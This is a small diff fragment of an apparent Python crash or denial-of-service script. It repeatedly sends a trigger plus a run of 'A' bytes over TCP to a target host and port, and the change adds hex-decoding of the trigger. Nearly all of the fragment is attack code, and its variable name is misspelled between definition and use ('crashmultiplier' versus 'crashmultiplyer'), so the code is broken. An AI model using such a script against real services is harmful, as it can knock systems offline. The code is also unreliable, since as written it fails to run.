@@ -17,7 +17,7 @@ crash = "\x41" # developer note change if you want to
 crashmultiplier = 1
 
 while 1:
-    buffer = mctrigger + crash * crashmultiplyer
+    buffer = mctrigger.decode("hex") + crash * crashmultiplyer
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect=s.connect((host,port))
     s.settimeout(1)
